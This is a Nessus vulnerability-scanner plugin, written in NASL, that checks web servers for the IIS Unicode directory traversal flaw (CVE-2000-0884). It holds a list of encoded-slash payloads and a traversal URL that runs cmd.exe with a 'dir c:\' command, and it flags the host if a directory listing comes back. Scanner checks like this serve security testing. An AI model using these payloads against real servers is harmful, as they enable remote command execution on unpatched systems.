# Approved 22Apr01 jao (replaces older version)

#
# This script was first written Renaud Deraison then
# completely re-written by HD Moore
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10537);
 script_version ("$Revision: 1.31 $");
 script_bugtraq_id(1806);
 script_cve_id("CVE-2000-0884");
 name["english"] = "IIS directory traversal";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote IIS server allows anyone to execute arbitrary commands
by adding a unicode representation for the slash character 
in the requested path.

Solution: See http://www.microsoft.com/technet/security/bulletin/ms00-078.asp
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Determines if arbitrary commands can be executed thanks to IIS";
 
 script_summary(english:summary["english"]);
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2001 H D Moore");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/iis");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;
if(!get_port_state(port))exit(0);
if(http_is_dead(port:port))exit(0);

dir[0] = "/scripts/";
dir[1] = "/msadc/";
dir[2] = "/iisadmpwd/";
dir[3] = "/_vti_bin/";		# FP
dir[4] = "/_mem_bin/";		# FP
dir[5] = "/exchange/";		# OWA
dir[6] = "/pbserver/";		# Win2K
dir[7] = "/rpc/";		# Win2K
dir[8] = "/cgi-bin/";
dir[9] = "/";

uni[0] = "%c0%af";
uni[1] = "%c0%9v";
uni[2] = "%c1%c1";
uni[3] = "%c0%qf";
uni[4] = "%c1%8s";
uni[5] = "%c1%9c";
uni[6] = "%c1%pc";
uni[7] = "%c1%1c";
uni[8] = "%c0%2f";
uni[9] = "%e0%80%af";




function check(req)
{
 r = http_keepalive_send_recv(port:port, data:http_get(item:req, port:port));
 if(r == NULL){
 	exit(0);
	}
 pat = "<DIR>";
 pat2 = "Directory of C";

 if((pat >< r) || (pat2 >< r)){
   	security_hole(port:port);
	return(1);
 	}
 return(0);
}


cmd = "/winnt/system32/cmd.exe?/c+dir+c:\\+/OG";
for(d=0;dir[d];d=d+1)
{
	for(u=0;uni[u];u=u+1)
	{
		url = string(dir[d], "..", uni[u], "..", uni[u], "..", uni[u], "..", uni[u], "..", uni[u], "..", cmd);
		if(check(req:url))exit(0);
	}
}



